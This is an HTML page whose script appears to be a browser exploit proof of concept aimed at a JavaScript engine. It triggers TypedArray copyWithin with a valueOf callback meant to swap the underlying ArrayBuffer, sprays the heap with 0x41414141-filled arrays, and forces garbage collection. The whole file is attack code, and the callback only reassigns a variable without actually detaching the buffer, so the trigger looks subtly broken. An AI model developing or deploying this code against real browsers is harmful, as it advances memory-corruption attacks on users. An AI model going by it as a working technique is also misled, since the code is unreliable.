<!DOCTYPE html>
<html>
<head>
    <script>
        async function trigger() {
            let spray = [];
            console.log("Starting test...");
            for (let i = 0; i < 10; i++) {
                try {
                    let ab = new ArrayBuffer(0x1000);
                    let u8 = new Uint8Array(ab);
                    function call_back() {
                        ab = new ArrayBuffer(0);
                        return 0;
                    }
                    u8.copyWithin(0x20, {valueOf: call_back});
                    spray.push({ ptr: new Array(64).fill(0x41414141), data: new Array(64).fill("test") });
                } catch (e) {
                    console.log("Error:", e);
                }
                let largeObject = new Array(250000).fill(0);
                largeObject = null;
            }
            spray = null;
            console.log("Test complete");
        }
    </script>
</head>
<body>
    <button id="test" onclick="trigger()">test</button>
</body>
</html>
